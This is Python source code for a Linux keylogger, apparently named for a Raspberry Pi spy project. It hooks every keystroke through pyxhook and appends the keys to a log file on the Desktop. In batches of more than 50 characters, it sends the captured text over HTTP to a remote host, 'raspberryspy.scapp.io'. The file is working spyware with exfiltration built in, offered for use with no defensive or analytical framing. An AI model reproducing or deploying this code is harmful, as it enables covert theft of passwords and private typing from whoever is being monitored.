# Python code for keylogger 
# to be used in linux 
import os 
import pyxhook 
import requests


global_string = ''

# This tells the keylogger where the log file will go. 
# You can set the file path as an environment variable ('pylogger_file'), 
# or use the default ~/Desktop/file.log 
log_file = os.environ.get( 
	'pylogger_file', 
	os.path.expanduser('~/Desktop/file.log') 
) 
# Allow setting the cancel key from environment args, Default: ` 
cancel_key = ord( 
	os.environ.get( 
		'pylogger_cancel', 
		'`'
	)[0] 
) 

# Allow clearing the log file on start, if pylogger_clean is defined. 
if os.environ.get('pylogger_clean', None) is not None: 
	try: 
		os.remove(log_file) 
	except EnvironmentError: 
	# File does not exist, or no permissions. 
		pass

#creating key pressing event and saving it into log file shtssthsnthstn
def OnKeyPress(event): 
	global global_string
	bad_chars = ['Up','Down','Left','Right', "Shift_L", "Shift_R", "Alt_L","Alt_R",	"Control_L","Control_R"]
	with open(log_file, 'a+') as f:
		print(event)
		print("**********")
		print(chr(event.Ascii))
		if event.Key not in bad_chars:
			f.write('{}'.format(chr(event.Ascii)))
			global_string = global_string + chr(event.Ascii)
			print(len(global_string))
			print(global_string)
			if len(global_string)>50:
				send_keys(global_string)
				global_string=""
			#	f.write(str(global_string))
				
# create a hook manager object 
new_hook = pyxhook.HookManager() 
new_hook.KeyDown = OnKeyPress 
# set the hook 
new_hook.HookKeyboard() 
try: 
	new_hook.start()		 # start the hook 
except KeyboardInterrupt: 
	# User cancelled from command line. 
	pass
except Exception as ex: 
	# Write exceptions to the log file, for analysis later. 
	msg = 'Error while catching events:\n {}'.format(ex) 
	pyxhook.print_err(msg) 
	with open(log_file, 'a') as f: 
		f.write('\n{}'.format(msg)) 


def send_keys(a_string):
	#keys_logged = readfile("/home/pi/Desktop/file.log")
	#URL="192.168.1.4"
	URL="raspberryspy.scapp.io"
	print(a_string)
	requests.get("http://"+ URL +"/in_string", params = {"key_info":a_string})
	




